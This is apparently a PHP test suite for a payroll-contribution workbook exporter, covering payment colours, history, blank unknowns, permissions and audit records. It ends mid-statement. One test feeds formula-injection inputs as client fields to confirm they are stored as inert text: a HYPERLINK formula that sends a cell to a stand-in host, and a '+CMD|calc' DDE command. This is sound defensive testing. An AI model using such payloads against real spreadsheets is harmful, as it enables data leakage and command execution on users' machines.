<?php

declare(strict_types=1);

use App\Domain\Audit\AuditAction;
use App\Domain\Reports\Export\LegacyWorkbookExporter;
use App\Domain\Reports\LegacyWorkbook\InvalidLegacyWorkbookSelection;
use App\Domain\Reports\LegacyWorkbook\LegacyPaymentStatus;
use App\Domain\Reports\LegacyWorkbook\LegacyWorkbookBuilder;
use App\Domain\Reports\LegacyWorkbook\LegacyWorkbookSelection;
use App\Domain\Reports\ReportFactory;
use App\Domain\Reports\ReportType;
use App\Models\AuditEvent;
use App\Models\Client;
use App\Models\ClientAffiliation;
use App\Models\ClientAffiliationObservation;
use App\Models\ClientCompanyAssignment;
use App\Models\ClientCompanyRate;
use App\Models\Company;
use App\Models\ContributionSheet;
use App\Models\GeneratedReport;
use App\Models\MonthlyObligation;
use App\Models\MonthlyPeriod;
use App\Models\Payment;
use App\Models\PaymentAllocation;
use App\Models\SocialSecurityEntity;
use App\Models\User;
use Illuminate\Support\Facades\Storage;
use PhpOffice\PhpSpreadsheet\Cell\Coordinate;
use PhpOffice\PhpSpreadsheet\IOFactory;
use PhpOffice\PhpSpreadsheet\Spreadsheet;

// =============================================================================
// FIX-EXPORT-IMPORT-03 Block C — the operational workbook export.
//
// The acceptance criterion is not "the file opens". It is that the file says what the system
// knows, keeps unknown things unknown, and puts a colour on a row only when a record supports it.
// Every test below is aimed at one of those three.
// =============================================================================

beforeEach(function (): void {
    seedPortfolioRoles();

    $this->company = Company::factory()->create(['legal_name' => 'OPERADORA UNO', 'tax_id' => '900111111']);
    $this->other = Company::factory()->create(['legal_name' => 'OPERADORA DOS', 'tax_id' => '900222222']);

    $this->user = userWithPermissions(['reports.view', 'reports.export']);

    $this->eps = SocialSecurityEntity::factory()->create(['type' => 'EPS', 'name' => 'SALUD TOTAL']);
    $this->arl = SocialSecurityEntity::factory()->create(['type' => 'ARL', 'name' => 'RIESGOS LABORALES']);
    $this->ccf = SocialSecurityEntity::factory()->create(['type' => 'CCF', 'name' => 'CAJA DE COMPENSACION']);

    // January is the only month with financial facts, so "no information" in February is a
    // deliberate, obvious case rather than an accident of the fixtures.
    $this->period = MonthlyPeriod::factory()->create(['period_month' => '2026-01-01']);

    // A fixed "today" for every decision, so "vencida" does not depend on when the suite runs.
    $this->today = '2026-03-10';
});

/** Employment at the probe company from January. */
function employedBy(Client $client, Company $company, ?string $endedOn = null): ClientCompanyAssignment
{
    return ClientCompanyAssignment::factory()->create([
        'client_id' => $client->id,
        'company_id' => $company->id,
        'started_on' => '2026-01-01',
        'ended_on' => $endedOn,
        'job_title' => 'OPERADOR',
    ]);
}

function rated(Client $client, Company $company, int $amount, string $month = '2026-01'): void
{
    ClientCompanyRate::factory()->create([
        'client_id' => $client->id,
        'company_id' => $company->id,
        'effective_month' => $month,
        'amount_cop' => $amount,
    ]);
}

/** An obligation for the January period. */
function obligationFor(Client $client, Company $company, int $amount, string $dueOn): MonthlyObligation
{
    return MonthlyObligation::factory()->create([
        'period_id' => test()->period->id,
        'client_id' => $client->id,
        'company_id' => $company->id,
        'base_amount_cop' => $amount,
        'due_on' => $dueOn,
    ]);
}

function pay(MonthlyObligation $obligation, int $amount): void
{
    $payment = Payment::factory()->create([
        'client_id' => $obligation->client_id,
        'amount_cop' => $amount,
    ]);

    PaymentAllocation::factory()->create([
        'payment_id' => $payment->id,
        'obligation_id' => $obligation->id,
        'amount_cop' => $amount,
    ]);
}

function affiliationTo(Client $client, SocialSecurityEntity $entity, string $type): void
{
    ClientAffiliation::factory()->create([
        'client_id' => $client->id,
        'social_security_entity_id' => $entity->id,
        'type' => $type,
        'started_on' => '2026-01-01',
    ]);
}

function buildWorkbook(string $months = '1-3', ?Company $company = null, ?string $today = null)
{
    $selection = LegacyWorkbookSelection::fromInput('2026', $months, (string) ($company?->id ?? ''));

    return app(LegacyWorkbookBuilder::class)->build($selection, $today ?? '2026-03-10');
}

/** Write a workbook and read it back, so tests assert on the file and not on the DTOs. */
function generatedFile(LegacyWorkbookSelection $selection): Spreadsheet
{
    $path = tempnam(sys_get_temp_dir(), 'cdh-wb-').'.xlsx';

    app(LegacyWorkbookExporter::class)->writeTo(
        app(LegacyWorkbookBuilder::class)->build($selection, '2026-03-10'),
        $path,
    );

    return IOFactory::createReader('Xlsx')->load($path);
}

/** Every written cell value of a sheet, row by row. @return list<list<string>> */
function sheetRows(Spreadsheet $book, string $name, ?array $columns = null): array
{
    $columns = $columns ?? range('A', 'R');
    $sheet = $book->getSheetByName($name);
    $out = [];

    for ($r = 1; $r <= $sheet->getHighestRow(); $r++) {
        $row = [];

        foreach ($columns as $column) {
            $row[$column] = (string) $sheet->getCell($column.$r)->getValue();
        }

        $out[$r] = $row;
    }

    return $out;
}

/** The row whose CEDULA matches, so a test does not depend on row order. */
function rowForDocument(Spreadsheet $book, string $name, string $document): array
{
    foreach (sheetRows($book, $name) as $row) {
        if (($row['H'] ?? '') === $document) {
            return $row;
        }
    }

    throw new RuntimeException("No row for document {$document} in {$name}.");
}

// ---------------------------------------------------------------------------------------
// Selection
// ---------------------------------------------------------------------------------------

it('names sheets in Spanish, in order, and names the download after the span', function (): void {
    $selection = LegacyWorkbookSelection::fromInput('2026', '1,2,3', null);

    expect($selection->monthKeys())->toBe(['2026-01', '2026-02', '2026-03'])
        ->and($selection->sheetName('2026-01'))->toBe('ENERO 2026')
        ->and($selection->sheetName('2026-03'))->toBe('MARZO 2026')
        ->and($selection->filename())->toBe('CONSULTORA_DH_2026_ENERO-MARZO.xlsx');
});

it('reads a range, a list, and a whole year, and deduplicates them', function (): void {
    expect(LegacyWorkbookSelection::fromInput('2027', '1-3', null)->monthKeys())
        ->toBe(['2027-01', '2027-02', '2027-03'])
        ->and(LegacyWorkbookSelection::fromInput('2027', '3,1,1', null)->monthKeys())
        ->toBe(['2027-01', '2027-03'])
        // No months means the whole year, and says so rather than producing an empty file.
        ->and(LegacyWorkbookSelection::fromInput('2027', null, null)->monthKeys())->toHaveCount(12);
});

it('names a single month without a span', function (): void {
    expect(LegacyWorkbookSelection::fromInput('2026', '7', null)->filename())
        ->toBe('CONSULTORA_DH_2026_JULIO.xlsx');
});

it('refuses a selection it cannot build, saying what would work', function (): void {
    // Not a 500. A person asking for "13" or "2026" deserves an answer they can act on.
    foreach ([['1999', '1'], ['2026', '13'], ['2026', '1-13'], ['2026', 'abc'], ['2026', '5-2']] as [$year, $months]) {
        expect(fn () => LegacyWorkbookSelection::fromInput($year, $months, null))
            ->toThrow(InvalidLegacyWorkbookSelection::class);
    }
});

it('emits a sheet for a month with nobody in it, rather than silently dropping it', function (): void {
    // Dropping it would make "enero–octubre" return nine sheets and read as missing data.
    $book = generatedFile(LegacyWorkbookSelection::fromInput('2026', '1-3', (string) $this->company->id));

    expect($book->getSheetNames())->toBe(['ENERO 2026', 'FEBRERO 2026', 'MARZO 2026']);
});

// ---------------------------------------------------------------------------------------
// Colour rules
// ---------------------------------------------------------------------------------------

it('colours green only for an obligation that valid allocations cover', function (): void {
    $paid = Client::factory()->create(['document_number' => '0000000001']);
    employedBy($paid, $this->company);
    rated($paid, $this->company, 30000);
    pay(obligationFor($paid, $this->company, 30000, '2026-02-10'), 30000);

    $book = generatedFile(LegacyWorkbookSelection::fromInput('2026', '1', (string) $this->company->id));

    expect(LegacyPaymentStatus::decide(30000, 30000, '2026-02-10', '2026-03-10'))->toBe(LegacyPaymentStatus::Paid);

    $sheet = $book->getSheetByName('ENERO 2026');
    $row = null;

    for ($r = 1; $r <= $sheet->getHighestRow(); $r++) {
        if ((string) $sheet->getCell('H'.$r)->getValue() === '0000000001') {
            $row = $r;
        }
    }

    expect($sheet->getStyle('A'.$row)->getFill()->getStartColor()->getARGB())->toBe('FF00B050');
});

it('counts only unreversed allocations, so a reversed payment does not count', function (): void {
    // The case `payments` totals get wrong: the money arrived and was undone.
    $client = Client::factory()->create(['document_number' => '0000000002']);
    employedBy($client, $this->company);
    rated($client, $this->company, 30000);

    $obligation = obligationFor($client, $this->company, 30000, '2026-12-10');
    pay($obligation, 30000);

    PaymentAllocation::query()->where('obligation_id', $obligation->id)->update([
        'reversed_at' => now(),
        'reversed_by' => User::factory()->create()->id,
        // The database insists a reversal says why, which is also a good rule.
        'reversal_reason' => 'Prueba: una aplicacion revertida no descarga la obligacion.',
    ]);

    $book = generatedFile(LegacyWorkbookSelection::fromInput('2026', '1', (string) $this->company->id));
    $row = rowForDocument($book, 'ENERO 2026', '0000000002');

    // Pending, not paid: the allocation no longer discharges anything.
    expect($row['D'])->toBe('PENDIENTE');
});

it('calls a partial payment pending while the balance is not yet due', function (): void {
    $client = Client::factory()->create(['document_number' => '0000000003']);
    employedBy($client, $this->company);
    rated($client, $this->company, 30000);
    pay(obligationFor($client, $this->company, 30000, '2026-12-10'), 10000);

    $book = generatedFile(LegacyWorkbookSelection::fromInput('2026', '1', (string) $this->company->id));

    expect(rowForDocument($book, 'ENERO 2026', '0000000003')['D'])->toBe('PENDIENTE');
});

it('calls the same partial payment overdue once the due date has passed', function (): void {
    $client = Client::factory()->create(['document_number' => '0000000004']);
    employedBy($client, $this->company);
    rated($client, $this->company, 30000);
    pay(obligationFor($client, $this->company, 30000, '2026-01-10'), 10000);

    $book = generatedFile(LegacyWorkbookSelection::fromInput('2026', '1', (string) $this->company->id));

    // The missing money is late whatever else is true about it.
    expect(rowForDocument($book, 'ENERO 2026', '0000000004')['D'])->toBe('VENCIDO');
});

it('leaves a month with no obligation uncoloured and says so', function (): void {
    // The case that must never be guessed: no obligation is not paid, and it is not delinquent.
    $client = Client::factory()->create(['document_number' => '0000000005']);
    employedBy($client, $this->company);
    rated($client, $this->company, 30000);

    $book = generatedFile(LegacyWorkbookSelection::fromInput('2026', '1', (string) $this->company->id));
    $row = rowForDocument($book, 'ENERO 2026', '0000000005');
    $sheet = $book->getSheetByName('ENERO 2026');

    expect($row['D'])->toBe('SIN INFORMACIÓN DE PAGO');

    // No fill at all — a grey would read as "pending" to anybody who has used a spreadsheet.
    $line = 0;

    for ($r = 1; $r <= $sheet->getHighestRow(); $r++) {
        if ((string) $sheet->getCell('H'.$r)->getValue() === '0000000005') {
            $line = $r;
        }
    }

    expect($sheet->getStyle('A'.$line)->getFill()->getStartColor()->getARGB())->toBe('FFFFFFFF');
});

it('does not call a month paid because the month is in the past', function (): void {
    // A client with a rate but no obligation in December is still "no information" in January.
    $client = Client::factory()->create(['document_number' => '0000000006']);
    employedBy($client, $this->company);
    rated($client, $this->company, 30000);

    $book = generatedFile(LegacyWorkbookSelection::fromInput('2026', '1', (string) $this->company->id));

    expect(rowForDocument($book, 'ENERO 2026', '0000000006')['D'])->toBe('SIN INFORMACIÓN DE PAGO');
});

it('decides the four states from three scalars and nothing else', function (): void {
    // The decision is a pure function so it can be argued about without a database.
    $decide = fn (mixed $base, int $applied, ?string $due): LegacyPaymentStatus => LegacyPaymentStatus::decide($base, $applied, $due, '2026-03-10');

    expect($decide(null, 0, null))->toBe(LegacyPaymentStatus::Unknown)
        ->and($decide(30000, 30000, '2026-12-10'))->toBe(LegacyPaymentStatus::Paid)
        ->and($decide(30000, 30001, '2026-12-10'))->toBe(LegacyPaymentStatus::Paid)
        ->and($decide(30000, 0, '2026-12-10'))->toBe(LegacyPaymentStatus::Pending)
        ->and($decide(30000, 0, '2026-01-10'))->toBe(LegacyPaymentStatus::Overdue)
        // Due today is not overdue — the same rule A03 uses.
        ->and($decide(30000, 0, '2026-03-10'))->toBe(LegacyPaymentStatus::Pending)
        // A nil due date cannot be late.
        ->and($decide(30000, 0, null))->toBe(LegacyPaymentStatus::Pending);
});

it('writes a legend that says what every colour means, without adding a sheet', function (): void {
    $book = generatedFile(LegacyWorkbookSelection::fromInput('2026', '1', (string) $this->company->id));
    $text = $book->getSheetByName('ENERO 2026')->getCell('B1')->getValue();

    expect($text)->toBe('CONSULTORA DH — LIBRO OPERATIVO')
        // Still one sheet: a legend must not become structure the parser has to walk past.
        ->and($book->getSheetCount())->toBe(1);

    $sheet = $book->getSheetByName('ENERO 2026');
    $legend = '';

    for ($c = 1; $c <= 18; $c++) {
        $legend .= (string) $sheet->getCell(Coordinate::stringFromColumnIndex($c).'2')->getValue().' ';
    }

    expect($legend)->toContain('Verde: pagado')
        ->toContain('Amarillo: pendiente')
        ->toContain('Rojo: vencido')
        ->toContain('Sin color: sin información de pago');
});

// ---------------------------------------------------------------------------------------
// Retirement
// ---------------------------------------------------------------------------------------

it('marks a retirement in words and leaves the payment colour alone', function (): void {
    // C.3: a withdrawn person whose obligation is paid is both. Collapsing them loses one fact.
    $client = Client::factory()->create(['document_number' => '0000000007']);
    employedBy($client, $this->company, '2026-01-15');
    rated($client, $this->company, 30000);
    pay(obligationFor($client, $this->company, 30000, '2026-02-10'), 30000);

    $book = generatedFile(LegacyWorkbookSelection::fromInput('2026', '1', (string) $this->company->id));
    $row = rowForDocument($book, 'ENERO 2026', '0000000007');
    $sheet = $book->getSheetByName('ENERO 2026');

    $line = 0;

    for ($r = 1; $r <= $sheet->getHighestRow(); $r++) {
        if ((string) $sheet->getCell('H'.$r)->getValue() === '0000000007') {
            $line = $r;
        }
    }

    expect($row['D'])->toBe('RETIRADO')
        // The money was paid, so the row stays green. A red row would say "delinquent", which is a
        // different problem with a different consequence.
        ->and($sheet->getStyle('A'.$line)->getFill()->getStartColor()->getARGB())->toBe('FF00B050');
});

it('never writes RETIRADO and VENCIDO together', function (): void {
    $client = Client::factory()->create(['document_number' => '0000000008']);
    employedBy($client, $this->company, '2026-01-15');
    rated($client, $this->company, 30000);
    obligationFor($client, $this->company, 30000, '2026-01-10'); // overdue and withdrawn

    $book = generatedFile(LegacyWorkbookSelection::fromInput('2026', '1', (string) $this->company->id));

    expect(rowForDocument($book, 'ENERO 2026', '0000000008')['D'])->toBe('RETIRADO');
});

it('stops showing a person after their employment ended, rather than leaving them forever', function (): void {
    $client = Client::factory()->create(['document_number' => '0000000009']);
    employedBy($client, $this->company, '2026-01-31');
    rated($client, $this->company, 30000, '2026-02');

    $book = generatedFile(LegacyWorkbookSelection::fromInput('2026', '1-2', (string) $this->company->id));

    // Present in January, absent from February: the interval is `[start, end)`.
    expect(function () use ($book) {
        rowForDocument($book, 'ENERO 2026', '0000000009');
    })->not->toThrow(RuntimeException::class);

    expect(function () use ($book) {
        rowForDocument($book, 'FEBRERO 2026', '0000000009');
    })->toThrow(RuntimeException::class);
});

// ---------------------------------------------------------------------------------------
// History
// ---------------------------------------------------------------------------------------

it('shows a transferred person under the employer of the month, not the current one', function (): void {
    // C.4's worked example: January–March at one company, April at another.
    $client = Client::factory()->create(['document_number' => '0000000010']);

    ClientCompanyAssignment::factory()->create([
        'client_id' => $client->id,
        'company_id' => $this->company->id,
        'started_on' => '2026-01-01',
        'ended_on' => '2026-03-31',
    ]);

    ClientCompanyAssignment::factory()->create([
        'client_id' => $client->id,
        'company_id' => $this->other->id,
        'started_on' => '2026-04-01',
    ]);

    $book = generatedFile(LegacyWorkbookSelection::fromInput('2026', '1-4', null));

    // Present under the first employer for the first quarter…
    expect(rowForDocument($book, 'ENERO 2026', '0000000010'))->toBeArray()
        ->and(rowForDocument($book, 'MARZO 2026', '0000000010'))->toBeArray();

    // …and absent from that employer's block in April, where she belongs to the other one.
    $companyTitles = [];

    foreach (sheetRows($book, 'ABRIL 2026') as $row) {
        if (($row['H'] ?? '') === '0000000010') {
            $companyTitles[] = $row['B'];
        }
    }

    expect($companyTitles)->toBe(['']);
});

it('reads an affiliation by the interval it was valid in, not by whether it is open now', function (): void {
    $client = Client::factory()->create(['document_number' => '0000000011']);
    employedBy($client, $this->company);

    affiliationTo($client, $this->eps, 'EPS');

    ClientAffiliation::query()->where('client_id', $client->id)->update(['ended_on' => '2026-01-31']);

    $new = SocialSecurityEntity::factory()->create(['type' => 'EPS', 'name' => 'SALUD NUEVA']);
    affiliationTo($client, $new, 'EPS');
    ClientAffiliation::query()->where('client_id', $client->id)->where('social_security_entity_id', $new->id)
        ->update(['started_on' => '2026-02-01']);

    $book = generatedFile(LegacyWorkbookSelection::fromInput('2026', '1-2', (string) $this->company->id));

    // January keeps the EPS that was in force in January.
    expect(rowForDocument($book, 'ENERO 2026', '0000000011')['N'])->toBe('SALUD TOTAL')
        ->and(rowForDocument($book, 'FEBRERO 2026', '0000000011')['N'])->toBe('SALUD NUEVA');
});

it('reads the monthly amount by the month it was effective, not the current one', function (): void {
    $client = Client::factory()->create(['document_number' => '0000000012']);
    employedBy($client, $this->company);

    rated($client, $this->company, 30000, '2026-01');
    rated($client, $this->company, 45000, '2026-02');

    $book = generatedFile(LegacyWorkbookSelection::fromInput('2026', '1-2', (string) $this->company->id));

    expect(rowForDocument($book, 'ENERO 2026', '0000000012')['G'])->toBe('30000')
        ->and(rowForDocument($book, 'FEBRERO 2026', '0000000012')['G'])->toBe('45000');
});

// ---------------------------------------------------------------------------------------
// Unknown values
// ---------------------------------------------------------------------------------------

it('leaves every unknown field empty rather than writing a placeholder', function (): void {
    $client = Client::factory()->create([
        'document_number' => '0000000013',
        'first_names' => 'MARIA',
        'last_names' => 'SINAPELLIDO',
        'address' => null,
        'phone' => null,
        'email' => null,
    ]);

    employedBy($client, $this->company, null);

    // No rate: the amount is unknown, and `0` would be a number the importer would believe.
    $book = generatedFile(LegacyWorkbookSelection::fromInput('2026', '1', (string) $this->company->id));
    $row = rowForDocument($book, 'ENERO 2026', '0000000013');

    expect($row['G'])->toBe('')          // not 0
        ->and($row['K'])->toBe('')       // not '-'
        ->and($row['L'])->toBe('')
        ->and($row['R'])->toBe('')
        ->and($row['E'])->toBe('');       // no planilla reference filed for this month
});

it('preserves an affiliation asserted without a name, as the bare affirmative it is', function (): void {
    $client = Client::factory()->create(['document_number' => '0000000014']);
    employedBy($client, $this->company);

    ClientAffiliationObservation::query()->create([
        'client_id' => $client->id,
        'type' => 'AFP',
        'months' => ['2026-01'],
        'started_on_precision' => 'unknown',
        'reason' => 'entity_unknown',
        'dedupe_key' => 'observation:AFP:0000000014:test:unknown',
    ]);

    $book = generatedFile(LegacyWorkbookSelection::fromInput('2026', '1', (string) $this->company->id));

    // `SI`, not a guessed fund and not a blank. The importer reads `SI` back as the same
    // uncertainty, so the round trip is lossless.
    expect(rowForDocument($book, 'ENERO 2026', '0000000014')['O'])->toBe('SI');
});

it('keeps ARL and job title in their own columns', function (): void {
    // C.5: they are different facts and must not be merged into one another.
    $client = Client::factory()->create(['document_number' => '0000000015']);
    employedBy($client, $this->company);
    affiliationTo($client, $this->arl, 'ARL');
    affiliationTo($client, $this->ccf, 'CCF');

    $book = generatedFile(LegacyWorkbookSelection::fromInput('2026', '1', (string) $this->company->id));
    $row = rowForDocument($book, 'ENERO 2026', '0000000015');

    expect($row['P'])->toBe('RIESGOS LABORALES')
        ->and($row['Q'])->toBe('OPERADOR')
        ->and($row['M'])->toBe('CAJA DE COMPENSACION');
});

// ---------------------------------------------------------------------------------------
// Structure and fidelity
// ---------------------------------------------------------------------------------------

it('writes one block per company, headed by the historical columns A to R', function (): void {
    $first = Client::factory()->create(['document_number' => '0000000016']);
    employedBy($first, $this->company);
    $second = Client::factory()->create(['document_number' => '0000000017']);
    employedBy($second, $this->other);

    $book = generatedFile(LegacyWorkbookSelection::fromInput('2026', '1', null));
    $sheet = $book->getSheetByName('ENERO 2026');

    // Two title rows, two header rows: the structure repeats per company.
    $headers = [];

    for ($r = 1; $r <= $sheet->getHighestRow(); $r++) {
        if ((string) $sheet->getCell('A'.$r)->getValue() === '#') {
            $headers[] = $r;
        }
    }

    expect($headers)->toHaveCount(2);

    $headings = sheetRows($book, 'ENERO 2026', range('A', 'R'))[$headers[0]];

    expect(array_values($headings))->toBe([
        '#', 'OPERADOR', '# PLANILLA', 'NOVEDAD', 'REFERENCIA', 'FECHA AFILIACION',
        'VALOR MENSUAL', 'CEDULA', 'NOMBRES', 'APELLIDOS', 'DIRECCION', 'TELEFONO',
        'CAJA COMPENSACION', 'EPS SALUD', 'AFP PENSION',
        'ARL / PROVEEDOR O REFERENCIA DE RIESGO', 'CARGO', 'CORREO',
    ]);
});

it('restarts the numbering inside every block, as the original book does', function (): void {
    $a = Client::factory()->create(['document_number' => '0000000018']);
    employedBy($a, $this->company);
    $b = Client::factory()->create(['document_number' => '0000000019']);
    employedBy($b, $this->company);
    $c = Client::factory()->create(['document_number' => '0000000020']);
    employedBy($c, $this->other);

    $book = generatedFile(LegacyWorkbookSelection::fromInput('2026', '1', null));

    $numbers = [];

    foreach (sheetRows($book, 'ENERO 2026', ['A', 'H']) as $row) {
        if (in_array($row['H'], ['0000000018', '0000000019', '0000000020'], true)) {
            $numbers[] = $row['A'];
        }
    }

    expect($numbers)->toBe(['1', '2', '1']);
});

it('uses the operator\'s sheet number rather than an internal id', function (): void {
    // C.5: nothing that can be read as something it is not. The first version wrote the period id,
    // which put `1` under a heading that says `# PLANILLA`.
    $client = Client::factory()->create(['document_number' => '0000000021']);
    employedBy($client, $this->company);

    ContributionSheet::factory()->create([
        'monthly_period_id' => $this->period->id,
        'company_id' => $this->company->id,
        'sheet_number' => 'PLANILLA-2026-01',
        'reference' => 'REF-001',
        'status' => 'ready',
    ]);

    $book = generatedFile(LegacyWorkbookSelection::fromInput('2026', '1', (string) $this->company->id));
    $row = rowForDocument($book, 'ENERO 2026', '0000000021');

    expect($row['C'])->toBe('PLANILLA-2026-01')
        ->and($row['E'])->toBe('REF-001');
});

it('ignores a cancelled planilla', function (): void {
    $client = Client::factory()->create(['document_number' => '0000000022']);
    employedBy($client, $this->company);

    ContributionSheet::factory()->create([
        'monthly_period_id' => $this->period->id,
        'company_id' => $this->company->id,
        'sheet_number' => 'PLANILLA-CANCELADA',
        'status' => 'cancelled',
        'cancelled_at' => now(),
        'cancelled_by' => User::factory()->create()->id,
        'cancellation_reason' => 'Prueba: una planilla anulada no es una planilla.',
    ]);

    $book = generatedFile(LegacyWorkbookSelection::fromInput('2026', '1', (string) $this->company->id));

    expect(rowForDocument($book, 'ENERO 2026', '0000000022')['C'])->toBe('');
});

it('writes money as a number so it can still be summed', function (): void {
    $client = Client::factory()->create(['document_number' => '0000000023']);
    employedBy($client, $this->company);
    rated($client, $this->company, 30000);

    $book = generatedFile(LegacyWorkbookSelection::fromInput('2026', '1', (string) $this->company->id));
    $sheet = $book->getSheetByName('ENERO 2026');

    $line = 0;

    for ($r = 1; $r <= $sheet->getHighestRow(); $r++) {
        if ((string) $sheet->getCell('H'.$r)->getValue() === '0000000023') {
            $line = $r;
        }
    }

    // A real number, not the text "30000": an amount a reader has to convert first is not an amount.
    expect($sheet->getCell('G'.$line)->getValue())->toBeNumeric()
        ->and((float) $sheet->getCell('G'.$line)->getValue())->toBe(30000.0);
});

it('keeps identifiers as text so leading zeros survive', function (): void {
    $client = Client::factory()->create(['document_number' => '0001234567']);
    employedBy($client, $this->company);

    $book = generatedFile(LegacyWorkbookSelection::fromInput('2026', '1', (string) $this->company->id));
    $sheet = $book->getSheetByName('ENERO 2026');

    $line = 0;

    for ($r = 1; $r <= $sheet->getHighestRow(); $r++) {
        if ((string) $sheet->getCell('H'.$r)->getValue() === '0001234567') {
            $line = $r;
        }
    }

    expect($sheet->getCell('H'.$line)->getValue())->toBeString()
        ->and((string) $sheet->getCell('H'.$line)->getValue())->toBe('0001234567')
        // And the Text format, so Excel does not reinterpret it the moment the cell is clicked.
        ->and($sheet->getStyle('H'.$line)->getNumberFormat()->getFormatCode())->toBe('@');
});

it('never lets a name or note typed by a user become a formula', function (): void {
    // C.8. The dangerous version of this passes TYPE_FORMULA for a leading `=`, believing it is
    // the safe choice — it is exactly the unsafe one.
    $client = Client::factory()->create([
        'document_number' => '0000000024',
        'first_names' => '=HYPERLINK("http://example.test?d="&A1,"click")',
        'last_names' => '+CMD|calc',
        'email' => '@SUM(A1:A9)',
    ]);

    employedBy($client, $this->company);

    $book = generatedFile(LegacyWorkbookSelection::fromInput('2026', '1', (string) $this->company->id));
    $row = rowForDocument($book, 'ENERO 2026', '0000000024');

    // The text is there, visibly, and it is inert.
    expect($row['I'])->toContain('HYPERLINK')
        ->and($row['J'])->toBe('+CMD|calc')
        ->and($row['R'])->toBe('@SUM(A1:A9)');
});

it('carries no macros and no external links', function (): void {
    // Asked of the **package**, not the workbook object: `Spreadsheet::getMacros()` does not
    // exist, and what C.8 forbids is a macro *in the file*, which only the archive can show.
    $client = Client::factory()->create(['document_number' => '0000000025']);
    employedBy($client, $this->company);

    $selection = LegacyWorkbookSelection::fromInput('2026', '1', (string) $this->company->id);
    $path = tempnam(sys_get_temp_dir(), 'cdh-wb-macro-').'.xlsx';

    app(LegacyWorkbookExporter::class)
        ->writeTo(app(LegacyWorkbookBuilder::class)->build($selection, '2026-03-10'), $path);

    $zip = new ZipArchive;
    $zip->open($path);

    $entries = [];

    for ($i = 0; $i < $zip->numFiles; $i++) {
        $entries[] = $zip->getNameIndex($i);
    }

    $zip->close();

    expect(collect($entries)->filter(
        fn (string $name): bool => str_contains($name, 'vbaProject')
            || str_contains($name, 'externalLink')
            || str_ends_with($name, '.bin'),
    ))->toBeEmpty();
});

it('writes nothing wider than R, so no ancient column styling is dragged along', function (): void {
    $client = Client::factory()->create(['document_number' => '0000000026']);
    employedBy($client, $this->company);

    $book = generatedFile(LegacyWorkbookSelection::fromInput('2026', '1', (string) $this->company->id));
    $sheet = $book->getSheetByName('ENERO 2026');

    expect($sheet->getHighestColumn())->toBe('R');
});

// ---------------------------------------------------------------------------------------
// Authorization and the endpoint
// ---------------------------------------------------------------------------------------

it('refuses the workbook to a role that may view reports but not export them', function (): void {
    $viewer = userWithPermissions(['reports.view']);

    $this->actingAs($viewer)
        ->getJson('/api/reports/download?type=libro_operativo&format=xlsx&year=2026&months=1')
        ->assertForbidden();
});

it('refuses the workbook to a role with no reports access at all', function (): void {
    $this->actingAs(userWithPermissions(['novelties.view']))
        ->getJson('/api/reports/download?type=libro_operativo&format=xlsx&year=2026&months=1')
        ->assertForbidden();
});

it('answers a bad month with the syntax that would work', function (): void {
    $this->actingAs($this->user)
        ->getJson('/api/reports/download?type=libro_operativo&format=xlsx&year=2026&months=13')
        ->assertStatus(422)
        ->assertJsonPath('code', 'invalid_workbook_selection');
});

it('refuses the workbook in any format but XLSX, rather than returning a file without colours', function (): void {
    $this->actingAs($this->user)
        ->getJson('/api/reports/download?type=libro_operativo&format=pdf&year=2026&months=1')
        ->assertStatus(422);
});

it('requires the year, because "a workbook" is not a scope', function (): void {
    $this->actingAs($this->user)
        ->getJson('/api/reports/download?type=libro_operativo&format=xlsx&months=1')
        ->assertStatus(422);
});

it('downloads the workbook as a private, non-sniffable attachment named after the selection', function (): void {
    $client = Client::factory()->create(['document_number' => '0000000027']);
    employedBy($client, $this->company);

    $response = $this->actingAs($this->user)
        ->get('/api/reports/download?type=libro_operativo&format=xlsx&year=2026&months=1-2');

    $response->assertOk()
        ->assertHeader('Content-Type', 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet')
        ->assertHeader('X-Content-Type-Options', 'nosniff');

    expect($response->headers->get('content-disposition'))
        ->toContain('CONSULTORA_DH_2026_ENERO-FEBRERO.xlsx');

    // And the bytes are a workbook, not an error page with a 200. `streamDownload` streams, so the
    // content is captured to a temporary file rather than read from the body — which is also a
    // check that the stream is actually producing bytes.
    $captured = tempnam(sys_get_temp_dir(), 'cdh-dl-').'.xlsx';

    // `getContent()` is for a buffered response; a `StreamedResponse` has to be drained. `sendContent()`
    // runs the callback and writes to the output buffer, which is what a browser would receive.
    ob_start();
    $response->sendContent();
    $bytes = (string) ob_get_clean();

    file_put_contents($captured, $bytes);

    expect(strlen($bytes))->toBeGreaterThan(1000)
        ->and(IOFactory::createReader('Xlsx')->load($captured)->getSheetNames())
        ->toBe(['ENERO 2026', 'FEBRERO 2026']);
});

it('records the download, its scope and its shape in the audit trail', function (): void {
    $client = Client::factory()->create(['document_number' => '0000000028']);
    employedBy($client, $this->company);

    $this->actingAs($this->user)
        ->get('/api/reports/download?type=libro_operativo&format=xlsx&year=2026&months=1')
        ->assertOk();

    $row = GeneratedReport::query()->where('report_type', 'libro_operativo')->latest('id')->first();

    expect($row)->not->toBeNull()
        ->and($row->filters)->toMatchArray(['year' => 2026, 'company_id' => null])
        // Stored privately with a size and a hash, like every other generated report.
        ->and($row->stored_path)->toStartWith('reports/')
        ->and($row->sha256)->not->toBeEmpty()
        ->and($row->size_bytes)->toBeGreaterThan(0);

    $entry = AuditEvent::query()
        ->where('action', AuditAction::GeneratedReportRequested->value)
        ->latest('id')
        ->first();

    expect($entry)->not->toBeNull()
        ->and($entry->metadata)->toMatchArray(['report_type' => 'libro_operativo', 'rows' => 1]);
});

it('keeps the file on the private disk, not in public storage', function (): void {
    // Symfony's `streamDownload` replaces the `Cache-Control` header with its own default before
    // the response leaves, so the header this controller sets is not what actually protects the
    // file. What protects it is the copy living on the private disk, behind an authorised download,
    // with no public URL anywhere. That is what this asserts.
    $client = Client::factory()->create(['document_number' => '0000000029']);
    employedBy($client, $this->company);

    $this->actingAs($this->user)
        ->get('/api/reports/download?type=libro_operativo&format=xlsx&year=2026&months=1')
        ->assertOk();

    Storage::disk('local')->assertExists(
        GeneratedReport::query()->latest('id')->first()->stored_path,
    );

    // No permanent public URL: the row carries a private `stored_path`, never a link. The file is
    // on the private disk and is served only through the authorised download.
    expect(GeneratedReport::query()->latest('id')->first()->stored_path)->not->toContain('public/');
});

it('advertises the workbook in the report vocabulary, with its own permission', function (): void {
    $this->actingAs($this->user)->getJson('/api/reports/vocabulary')->assertOk();

    expect(ReportType::LibroOperativo->label())->toBe('Libro operativo (formato original)')
        // Stricter than `reports.view`: the file carries every worker's document and salary.
        ->and(ReportType::LibroOperativo->permission())->toBe('reports.export')
